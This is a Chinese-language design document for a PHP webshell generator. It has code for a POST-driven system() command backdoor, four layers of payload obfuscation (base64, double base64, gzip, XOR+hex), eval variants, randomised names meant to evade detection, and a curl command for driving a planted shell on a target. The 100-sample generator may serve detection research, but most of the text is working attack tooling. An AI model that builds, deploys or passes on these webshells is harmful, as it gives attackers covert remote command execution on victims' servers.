# WebShell v7 代码生成逻辑说明

## 1. 基本架构

WebShell v7是v6的升级版本，采用了更复杂的加密和混淆技术，主要包含以下核心组件：

### 1.1 随机字符串生成
```python
def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))
```
- 用于生成随机变量名和参数名
- 默认长度为8个字符
- 仅使用字母字符

### 1.2 XOR加密实现
```python
def xor_encrypt(s, key):
    return ''.join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(s)])
```
- 使用XOR算法对payload进行加密
- 密钥循环使用
- 字符级别的加密

## 2. Payload生成流程

### 2.1 基础payload结构
```php
<?php ${VAR} = {CODE}; {EVAL}(${VAR}); ?>
```

### 2.2 命令执行代码
```php
if(isset($_POST["{param_name}"])){
    system($_POST["{param_name}"]);
}
```
- 使用POST方法接收参数
- 参数名随机生成
- 使用system()函数执行命令

### 2.3 加密方式
支持四种不同的加密方式：

1. Base64编码
```php
${var_name} = base64_decode("...");
```

2. 双重Base64编码
```php
${var_name} = base64_decode(base64_decode("..."));
```

3. Gzip压缩+Base64编码
```php
${var_name} = gzinflate(base64_decode("..."));
```

4. XOR加密+Hex编码
```php
${var_name} = "";
$_ = "加密数据";
$k = "密钥";
for($i=0;$i<strlen($_);$i+=2){
    ${var_name} .= chr(hexdec(substr($_,$i,2))^ord($k[$i%strlen($k)]));
}
```

## 3. eval函数变体

### 3.1 eval函数的不同形式
```python
eval_variants = [
    'eval(${VAR})',
    'e'.upper() + 'val(${VAR})',
    '@eval(${VAR})'
]
```
- 普通eval
- 动态构造eval
- 错误抑制的eval

## 4. 使用方法

### 4.1 生成样本
```python
python3 gen_php_webshellv7.py  # 生成100个样本
```

### 4.2 连接方式
```bash
# 使用生成时显示的参数名
curl -X POST http://target/shell_XX.php -d "参数名=命令"
```

## 5. 安全特性

1. 多层加密
   - 单层/双层Base64
   - Gzip+Base64
   - XOR+Hex

2. 代码混淆
   - 随机变量名
   - 随机参数名
   - eval函数变体

3. 通信安全
   - 仅支持POST方法
   - 参数名随机化
   - 每个样本使用不同的参数名

## 6. v7相对v6的改进

1. 加密方式
   - 新增双重Base64编码
   - 改进的XOR加密实现

2. 代码结构
   - 更简洁的payload结构
   - 更灵活的eval变体
   - 统一的POST方法

3. 安全性
   - 去除了明显的eval拆分
   - 更随机的参数名生成
   - 更好的错误处理 